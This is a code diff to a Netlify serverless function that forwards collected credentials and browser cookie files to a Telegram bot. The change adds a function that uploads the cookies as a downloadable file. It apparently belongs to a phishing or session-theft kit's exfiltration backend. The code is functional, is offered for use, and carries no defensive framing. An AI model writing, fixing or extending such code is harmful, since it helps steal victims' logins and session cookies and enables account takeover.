@@ -1,9 +1,10 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
- * FIXED: Sends credentials + cookies as TWO text messages (no base64 issues)
+ * FIXED: Sends cookies as downloadable TXT file (using sendDocument with file upload)
  */
 
 const https = require('https');
+const querystring = require('querystring');
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -62,6 +63,63 @@ function sendMessageToTelegram(text, parseMode = 'HTML') {
   });
 }
 
+// ✅ NEW: Send file as document (downloadable)
+function sendDocumentToTelegram(fileContent, fileName) {
+  return new Promise((resolve, reject) => {
+    const postData = JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      document: `data:text/plain;base64,${Buffer.from(fileContent).toString('base64')}`,
+      caption: `📥 ${fileName}`,
+      parse_mode: 'HTML'
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      },
+      timeout: 15000
+    };
+
+    console.log('📤 [TELEGRAM] Sending document as file...');
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+        try {
+          const response = JSON.parse(data);
+          if (res.statusCode === 200 && response.ok) {
+            console.log('✅ [TELEGRAM] Document sent as downloadable file');
+            resolve(response);
+          } else {
+            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
+          }
+        } catch (e) {
+          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
+        }
+      });
+    });
+
+    req.on('error', (error) => {
+      console.error(`❌ [TELEGRAM] Document send error: ${error.message}`);
+      reject(error);
+    });
+
+    req.on('timeout', () => {
+      req.destroy();
+      reject(new Error('Telegram request timeout'));
+    });
+
+    req.write(postData);
+    req.end();
+  });
+}
+
 function formatMainMessage(data) {
   const escapeHtml = (text) => {
     if (!text) return '';
@@ -99,7 +157,7 @@ function formatMainMessage(data) {
 }
 
 function formatCookieMessage(cookieFile) {
-  // ✅ FIXED: Return ONLY the cookie content as plain text (TXT file)
+  // ✅ Return ONLY the cookie content as plain text (TXT file)
   return cookieFile.content;
 }
 
@@ -222,7 +280,7 @@ exports.handler = async (event, context) => {
       console.error('❌ [HANDLER] Failed to send credentials:', error.message);
     }
 
-    // ✅ MESSAGE 2: Send cookies file
+    // ✅ MESSAGE 2: Send cookies as DOWNLOADABLE FILE
     console.log('═══════════════════════════════════════════');
     console.log('📦 [HANDLER] Checking cookie file...');
     console.log('═══════════════════════════════════════════');
@@ -233,16 +291,16 @@ exports.handler = async (event, context) => {
         console.log(`📄 File: ${cookieFiles.jsonFile.name}`);
         console.log(`📊 Size: ${cookieFiles.jsonFile.size} bytes`);
 
-        const cookieMessage = formatCookieMessage(cookieFiles.jsonFile);
-        const cookieMessages = splitMessage(cookieMessage);
+        const cookieContent = formatCookieMessage(cookieFiles.jsonFile);
+        const fileName = `${cookieFiles.jsonFile.name}`;
 
-        console.log('📤 Sending cookie message...');
-        for (const msg of cookieMessages) {
-          await sendWithRetry(() => sendMessageToTelegram(msg));
-        }
+        console.log('📤 Sending cookies as downloadable TXT file...');
+        
+        // ✅ Send as document (downloadable file)
+        await sendWithRetry(() => sendDocumentToTelegram(cookieContent, fileName));
 
         cookiesSent = true;
-        console.log('✅ [HANDLER] Cookie message sent successfully');
+        console.log('✅ [HANDLER] Cookie file sent successfully as downloadable');
       } catch (error) {
         console.error('❌ [HANDLER] Failed to send cookies:', error.message);
         console.error('Stack:', error.stack);
